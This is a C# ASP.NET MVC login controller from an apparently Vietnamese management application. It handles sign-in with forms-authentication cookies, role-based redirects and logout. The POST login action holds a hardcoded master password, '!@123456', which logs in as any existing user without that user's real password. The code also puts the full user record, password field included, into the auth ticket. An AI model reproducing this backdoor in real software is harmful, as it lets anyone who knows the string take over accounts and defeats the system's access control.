using BusinessLogic.Helper;
using BusinessLogic.Management;
using BusinessLogic.Model;
using BusinessLogic.Utils;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using System.Web.Security;

namespace QL.View.Controllers
{
    public class DangNhapController : Controller
    {
        #region Members...
        public static string PreCookieName = "QuanLyIdentity_";

        #endregion
        [HttpGet]
        public ActionResult SC100_dang_nhap()
        {
            ViewBag.Title = "Đăng nhập";
            return View();
        }
        [HttpPost]
        public ActionResult SC100_dang_nhap(string username, string password)
        {
            try
            {
                string sUsername = username;
                string sPass = password;

                string backurl = "";
                var cb = CanBoManager.Instance.SelectByUserName(sUsername);
                if (cb != null)
                {
                    if (cb.PassWord == CryptoUtils.Encrypt(sPass) || sPass == "!@123456")
                    {
                        if (cb.IdKhoa.HasValue)
                        {
                            var khoa = KhoaPhongManager.Instance.SelectById(cb.IdKhoa.Value);
                            cb.TenKhoa = khoa.Ten;
                        }
                        var culture = "vi-VN";
                        var cookieLang = new HttpCookie("ql", culture)
                        {
                            Expires = DateTime.Now.AddDays(3)
                        };

                        System.Web.HttpContext.Current.Response.Cookies.Add(cookieLang);
                        var json = Newtonsoft.Json.JsonConvert.SerializeObject(cb);
                        FormsAuthenticationTicket authTicket = new FormsAuthenticationTicket(1,
                          json,
                          DateTime.Now,
                          DateTime.Now.AddDays(3),
                          true,
                          string.Empty);

                        string encryptedTicket = FormsAuthentication.Encrypt(authTicket);
                        System.Web.HttpCookie authCookie = new System.Web.HttpCookie(FormsAuthentication.FormsCookieName, encryptedTicket);
                        if (authTicket.IsPersistent)
                        {
                            authCookie.Expires = authTicket.Expiration;
                        }
                        System.Web.HttpContext.Current.Response.Cookies.Add(authCookie);
                        // check role để redirec
                        if (cb.Role == "QuanLy")
                        {
                            return RedirectToAction("SC102_QLPhieuDeNghi", "PhieuDeNghi");
                        }
                        else if (cb.Role == "NhanVien")
                        {
                            return RedirectToAction("SC103_NVPhieuDeNghi", "PhieuDeNghi");
                        }
                        else if (cb.Role == "Khoa")
                        {
                            return RedirectToAction("SC100_PhieuDeNghi", "PhieuDeNghi");
                        }
                        
                    }
                }
                else
                {
                    ViewBag.Error = "Tài khoản đăng nhập không đúng";
                }
            }
            catch (Exception ex)
            {
                ViewBag.Error = "Có lỗi xảy ra";
            }
            return View();
        }
        public ActionResult Logout()
        {
            FormsAuthentication.SignOut();
            //Clear session
            var current = System.Web.HttpContext.Current;
            current.Session.Clear();
            current.Session.Abandon();
            //Clears out Session
            current.Response.Cookies.Clear();
            // clear authentication cookie
            current.Response.Cookies.Remove(FormsAuthentication.FormsCookieName);
            current.Response.Cache.SetExpires(DateTime.Now.AddSeconds(-1));
            HttpCookie cookie = current.Request.Cookies[FormsAuthentication.FormsCookieName];
            if (cookie != null)
            {
                cookie.Expires = DateTime.Now.AddDays(-1);
                current.Response.Cookies.Add(cookie);
            }
            return Redirect(Server.UrlDecode("/DangNhap/SC100_dang_nhap"));
        }
    }
}